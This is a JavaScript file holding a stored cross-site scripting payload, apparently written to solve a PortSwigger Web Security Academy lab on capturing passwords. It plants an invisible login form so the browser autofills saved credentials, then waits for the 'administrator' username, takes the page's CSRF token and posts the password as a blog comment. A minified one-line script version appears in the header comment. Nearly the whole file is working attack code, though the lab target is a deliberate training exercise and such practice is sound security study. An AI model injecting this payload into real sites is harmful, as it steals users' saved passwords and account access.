// The code below serves as a payload to solve the following lab:
// https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

// The code creates an invisible form and appends it to the body of the comment page at:
// https://<SUB_DOMAIN>.web-security-academy.net/post?postId=1
// It then listens to the username and password elements until username is equal to "administrator",
// At which point the password will be commented onto the first blog posts comment page.
// Because a CSRF token is required to post a comment, the program also takes the token value.

// IMPORTANT NOTE: The code below won't actually work, as it is too long with the comments.
// Instead use the following minimized version without comments:
// <script>const e=document.createElement("form"),t=document.createElement("input"),n=document.createElement("input");t.setAttribute("type","username"),t.setAttribute("name","username"),n.setAttribute("type","password"),n.setAttribute("name","password"),e.appendChild(t),e.appendChild(n),e.style.opacity=0;document.getElementsByTagName("body")[0].appendChild(e);const o=function(){const e=encodeURIComponent(t.value),o=encodeURIComponent(n.value);if("administrator"===e&&o){const t={csrf:document.getElementsByTagName("form")[0].querySelector('input[type="hidden"][name="csrf"]').value,postId:1,comment:o,name:e,email:encodeURIComponent("fakeemail@example.com"),website:encodeURIComponent("https://www.example.com")},n=Object.keys(t).map((e=>`${e}=${t[e]}`)).join("&");fetch("/post/comment",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:n}).then((e=>e.text())).then((e=>{console.log("Success!")})).catch((e=>{console.error("Failure...")}))}};t.addEventListener("input",o),n.addEventListener("input",o);</script>

// Create form and inputs
const form = document.createElement("form");
const usernameInput = document.createElement("input");
const passwordInput = document.createElement("input");

// Add attributes to form elements
usernameInput.setAttribute("type", "username");
usernameInput.setAttribute("name", "username");
passwordInput.setAttribute("type", "password");
passwordInput.setAttribute("name", "password");

// Append username and password inputs to form
form.appendChild(usernameInput);
form.appendChild(passwordInput);

// Make form invisible
form.style.opacity = 0;

// Append form to body of page
const body = document.getElementsByTagName("body")[0];
body.appendChild(form);

// Grab CSRF Token  for comment form and send comment with username and password
const handleInput = function() {
    const username = encodeURIComponent(usernameInput.value);
    const password = encodeURIComponent(passwordInput.value);

    // Otherwise a post will be sent for every letter of "administrator".
    if (username === "administrator" && password) {
        const commentForm = document.getElementsByTagName('form')[0];
        const csrfInput = commentForm.querySelector('input[type="hidden"][name="csrf"]');
        const csrf = csrfInput.value;
        const comment = {
            csrf: csrf,
            postId: 1,
            comment: password,
            name: username,
            email: encodeURIComponent("fakeemail@example.com"),
            website: encodeURIComponent("https://www.example.com")
        };
        const requestBody = Object.keys(comment)
            .map(key => `${key}=${comment[key]}`)
            .join('&');
        fetch('/post/comment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: requestBody
        })
            .then(response => response.text())
            .then(data => {
                console.log("Success!");
            })
            .catch(error => {
                console.error("Failure...");
            });
    }
};

// Wait for username and password to be filled out
usernameInput.addEventListener("input", handleInput);
passwordInput.addEventListener("input", handleInput);
